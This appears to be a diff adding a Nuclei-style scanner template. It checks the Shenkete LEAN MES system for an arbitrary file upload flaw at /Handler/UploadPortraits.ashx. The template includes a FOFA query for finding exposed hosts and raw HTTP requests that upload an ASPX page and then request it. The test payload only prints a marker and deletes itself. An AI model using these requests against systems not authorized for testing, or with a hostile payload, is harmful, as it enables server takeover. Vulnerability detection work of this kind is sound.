@@ -1,0 +1,37 @@
+id: ShenKeTe-LEAN-MES-UploadPortraits_ashx-File-Upload
+
+info:
+  name: 深科特 LEAN MES系统 /Handler/UploadPortraits.ashx 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: (title="LEAN MES - 用户登录" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+    深科特 LEAN MES /Handler/UploadPortraits.ashx 接口存在任意文件上传漏洞，攻击者可通过构造包含恶意文件的HTTP请求，利用该接口将文件上传至服务器指定目录，并可通过后续请求直接访问上传的文件，进而获取服务器权限、执行恶意代码，严重危害系统安全。
+  reference:
+    - 
+  tags: file-upload, shenkete, leanmes
+
+http:
+  - raw:
+      - |-
+        POST /Handler/UploadPortraits.ashx?Type=Upload&UserId=1&Filename=1.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundary--
+
+      - |-
+        GET /Content/images/portraits/1.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code == 200 && contains_all(body, 'pboyjnnrfipmplsukdeczudsefxmywe')"
